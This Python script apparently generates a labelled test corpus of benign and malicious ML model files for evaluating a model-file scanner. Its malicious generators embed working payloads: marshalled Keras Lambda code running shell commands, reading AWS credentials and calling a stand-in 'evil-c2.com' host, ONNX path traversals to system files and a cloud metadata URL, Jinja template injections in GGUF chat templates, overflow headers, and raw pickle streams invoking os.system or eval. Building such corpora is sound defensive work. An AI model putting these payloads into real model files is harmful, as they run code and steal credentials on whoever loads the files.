#!/usr/bin/env python3
"""
Builds a stratified multi-format evaluation corpus (Pickle, PyTorch ZIP, HDF5, ONNX, GGUF, Safetensors)
combining existing samples, MalHug archives (if present), and parametric CVE mutations + benign architectures.
Usage:
    python3 build_1500_corpus.py --out-dir corpus_1500 --count 300
"""
import argparse
import base64
import io
import json
import marshal
import os
import pickle
import random
import struct
import zipfile
from pathlib import Path

import h5py
import numpy as np
import onnx
from onnx import TensorProto, helper

def make_benign_hdf5(path: Path, seed: int):
    layers = [{"class_name": "Dense", "config": {"units": 16 + (seed % 64), "activation": "relu"}} for _ in range(2 + (seed % 4))]
    with h5py.File(path, "w") as f:
        f.attrs["model_config"] = json.dumps({"class_name": "Sequential", "config": {"name": f"seq_{seed}", "layers": layers}})
        grp = f.create_group("model_weights")
        grp.create_dataset("w0", data=np.random.randn(16, 16).astype(np.float32))

def make_malicious_hdf5(path: Path, seed: int):
    payloads = [
        "import os; os.system('sh -c id')",
        "import subprocess; subprocess.Popen(['/bin/sh', '-c', 'whoami'])",
        "import socket; s = socket.socket()",
        "import urllib.request; urllib.request.urlopen('http://evil-c2.com/ping')",
        "__import__('os').popen('cat /tmp/.aws/credentials')",
    ]
    code_obj = compile(payloads[seed % len(payloads)], f"<lambda_{seed}>", "exec")
    b64_code = base64.b64encode(marshal.dumps(code_obj)).decode()
    with h5py.File(path, "w") as f:
        f.attrs["model_config"] = json.dumps({
            "class_name": "Sequential",
            "config": {"layers": [
                {"class_name": "Dense", "config": {"units": 32}},
                {"class_name": "Lambda", "config": {"function": [b64_code, None, None]}},
            ]}
        })

def make_benign_onnx(path: Path, seed: int):
    op = ["Relu", "Sigmoid", "Tanh", "Identity"][seed % 4]
    node = helper.make_node(op, ["X"], ["Y"], name=f"node_{seed}")
    dim = 4 + (seed % 16)
    g = helper.make_graph([node], f"graph_{seed}", [helper.make_tensor_value_info("X", TensorProto.FLOAT, [dim])], [helper.make_tensor_value_info("Y", TensorProto.FLOAT, [dim])])
    onnx.save(helper.make_model(g), str(path))

def make_malicious_onnx(path: Path, seed: int):
    node = helper.make_node("Relu", ["X"], ["Y"])
    traversals = [
        "../../../../etc/passwd",
        "../../../tmp/.aws/credentials",
        "/etc/shadow",
        "http://169.254.169.254/latest/meta-data/iam/",
        "..\\..\\..\\Windows\\win.ini",
    ]
    ext_t = TensorProto(name=f"w_{seed}", data_type=TensorProto.FLOAT, dims=[4], data_location=TensorProto.EXTERNAL)
    e = ext_t.external_data.add()
    e.key, e.value = "location", traversals[seed % len(traversals)]
    g = helper.make_graph([node], f"mal_graph_{seed}", [helper.make_tensor_value_info("X", TensorProto.FLOAT, [4])], [helper.make_tensor_value_info("Y", TensorProto.FLOAT, [4])], [ext_t])
    onnx.save(helper.make_model(g), str(path))

def make_benign_gguf(path: Path, seed: int):
    meta = f"general.name=model_{seed}\ntokenizer.ggml.chat_template={{{{ messages[0]['content'] }}}}".encode()
    with open(path, "wb") as f:
        f.write(b"GGUF" + struct.pack("<IQQ", 3, 2 + (seed % 5), 1 + (seed % 3)) + meta + os.urandom(128))

def make_malicious_gguf(path: Path, seed: int):
    ssti_list = [
        b"tokenizer.ggml.chat_template={{ cycler.__init__.__globals__.os.popen('id').read() }}",
        b"tokenizer.ggml.chat_template={{ joiner.__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"id\")') }}",
        b"tokenizer.ggml.chat_template={{ namespace.__init__.__globals__.os.system('curl http://evil-c2.com') }}",
    ]
    with open(path, "wb") as f:
        if seed % 4 == 0:
            # Heap allocation integer overflow attack
            f.write(b"GGUF" + struct.pack("<IQQ", 3, 999999999, 1) + b"overflow_test")
        else:
            f.write(b"GGUF" + struct.pack("<IQQ", 3, 1, 1) + ssti_list[seed % len(ssti_list)])

def make_benign_safetensors(path: Path, seed: int):
    n_bytes = 64 + (seed % 8) * 16
    hdr = json.dumps({"weight": {"dtype": "F32", "shape": [n_bytes // 4], "data_offsets": [0, n_bytes]}}).encode()
    with open(path, "wb") as f:
        f.write(struct.pack("<Q", len(hdr)) + hdr + os.urandom(n_bytes))

def make_malicious_safetensors(path: Path, seed: int):
    hdr = json.dumps({"weight": {"dtype": "F32", "shape": [16], "data_offsets": [0, 99999999 + seed]}}).encode()
    with open(path, "wb") as f:
        f.write(struct.pack("<Q", len(hdr)) + hdr + b"\x00" * 64)

def make_benign_pickle(path: Path, seed: int):
    obj = {"layer": f"fc_{seed}", "weights": [float(i) for i in range(20 + (seed % 30))], "lr": 0.001 * (1 + (seed % 5))}
    with open(path, "wb") as f:
        pickle.dump(obj, f, protocol=seed % 5)

def make_malicious_pickle_p4(path: Path, seed: int):
    # Protocol 4 STACK_GLOBAL stream without executing malicious code on host
    mods = [(b"os", b"system", b"echo pwn"), (b"posix", b"system", b"id"), (b"subprocess", b"getoutput", b"whoami"), (b"builtins", b"eval", b"__import__('os').system('id')")]
    m, a, cmd = mods[seed % len(mods)]
    stream = (
        b"\x80\x04\x95\x30\x00\x00\x00\x00\x00\x00\x00"
        + b"\x8c" + bytes([len(m)]) + m + b"\x94"
        + b"\x8c" + bytes([len(a)]) + a + b"\x94"
        + b"\x93\x94"
        + b"\x8c" + bytes([len(cmd)]) + cmd + b"\x94"
        + b"\x85\x94R\x94."
    )
    if seed % 3 == 0 and str(path).endswith(".zip"):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("archive/data.pkl", stream)
        raw = bytearray(buf.getvalue())
        if seed % 6 == 0 and len(raw) > 8:
            raw[6] |= 0x01  # Spoof ZIP encryption bit 0x1
        path.write_bytes(bytes(raw))
    else:
        path.write_bytes(stream)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out-dir", type=Path, default=Path("corpus_batch"))
    ap.add_argument("--count", type=int, default=200, help="Number of new models to generate (50% benign, 50% malicious)")
    args = ap.parse_args()
    args.out_dir.mkdir(parents=True, exist_ok=True)

    half = args.count // 2
    for i in range(half):
        fmt_idx = i % 5
        if fmt_idx == 0:
            make_benign_hdf5(args.out_dir / f"benign_keras_{i:04d}.h5", i)
            make_malicious_hdf5(args.out_dir / f"malicious_keras_{i:04d}.h5", i)
        elif fmt_idx == 1:
            make_benign_onnx(args.out_dir / f"benign_graph_{i:04d}.onnx", i)
            make_malicious_onnx(args.out_dir / f"malicious_traversal_{i:04d}.onnx", i)
        elif fmt_idx == 2:
            make_benign_gguf(args.out_dir / f"benign_llm_{i:04d}.gguf", i)
            make_malicious_gguf(args.out_dir / f"malicious_ssti_{i:04d}.gguf", i)
        elif fmt_idx == 3:
            make_benign_safetensors(args.out_dir / f"benign_st_{i:04d}.safetensors", i)
            make_malicious_safetensors(args.out_dir / f"malicious_oob_{i:04d}.safetensors", i)
        else:
            make_benign_pickle(args.out_dir / f"benign_ckpt_{i:04d}.pkl", i)
            ext = ".zip" if (i % 3 == 0) else ".pkl"
            make_malicious_pickle_p4(args.out_dir / f"malicious_p4_{i:04d}{ext}", i)

    print(f"[+] Generated {args.count} balanced multi-format models in {args.out_dir}/")

if __name__ == "__main__":
    main()
